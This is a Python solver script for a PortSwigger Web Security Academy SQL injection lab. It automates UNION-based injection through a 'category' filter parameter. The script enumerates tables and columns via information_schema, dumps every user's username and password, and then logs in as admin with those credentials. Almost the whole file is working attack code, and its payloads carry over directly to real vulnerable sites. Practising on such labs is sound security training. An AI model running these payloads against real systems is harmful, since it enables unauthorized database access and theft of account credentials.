import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# lab_url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
# db: PostgreSQL
# author: 0xyf


class SQLi5:
    def __init__(self):
        self.lab_id = "0ad1002c035d539e81e35c840089001c"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.get_csrf_token()

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        params = {"category": payload}
        r = requests.get(
            f"{self.vuln_url}", params=params, proxies=self.proxies, verify=False
        )
        return r

    def get_tables(self):
        payload = "'UNION SELECT TABLE_NAME, '1011' FROM information_schema.TABLES-- -"
        r = self.execute_request(payload)
        tables = self.parse(r)

        a = [x for x in tables if "users" in x]  # tables with the word 'user' in them
        self.table = a[0]  # index 0 is the custom user table created for the lab
        print(f"[*] user table: {self.table}")

    def get_columns(self):
        payload = f"'UNION SELECT column_name,'3619' FROM information_schema.COLUMNS WHERE table_name='{self.table}'-- - "
        r = self.execute_request(payload)
        self.columns = self.parse(r)
        self.email, self.password_col, self.username_col = self.columns
        print(f"[*] columns: {self.columns}")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def get_creds(self):
        payload = f"'UNION SELECT CONCAT({self.username_col}, ':', {self.password_col}),'3619' FROM {self.table}-- -"
        r = self.execute_request(payload)
        users_creds = self.parse(r)  # contains creds of all users
        admin_creds = [x for x in users_creds if "admin" in x][
            0
        ]  # creds with the word 'admin' in them, index 0 should be the only one.
        self.username, self.password = admin_creds.split(":")
        print(f"[*] creds: {users_creds}")

    def login(self):
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def solve(self):
        self.get_tables()
        self.get_columns()
        self.get_creds()
        self.login()
        self.check_solved()

    @staticmethod
    def parse(r):
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table")
        headers = [header.text.strip() for header in table.find_all("th")]
        return headers


def main():
    SQLi5().solve()


if __name__ == "__main__":
    main()
